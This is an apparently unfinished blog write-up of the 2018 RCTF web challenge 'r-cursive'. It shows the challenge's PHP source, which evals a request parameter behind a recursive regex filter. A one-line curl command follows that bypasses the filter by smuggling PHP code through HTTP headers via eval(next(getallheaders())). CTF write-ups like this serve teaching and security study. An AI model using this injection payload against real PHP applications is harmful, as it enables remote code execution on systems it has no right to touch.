---
title: 2018 RCTF Web Writeup
tags:
  - Writeup
abstract: 待补充
top: 0
date: 2019-04-02 23:34:37
---

```php
<?php
sha1($_SERVER['REMOTE_ADDR']) === 'f6e5575f93a408c5cb709c73eaa822cb09b4d0f7' ?: die();
';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
这个绕过有点牛逼：curl "http://xxxx.sandbox.r-cursive.ml:1337/?cmd=eval(next(getallheaders()));" -H "User-Agent: phpinfo();" -H "Accept: asdasd/asdasda"
```
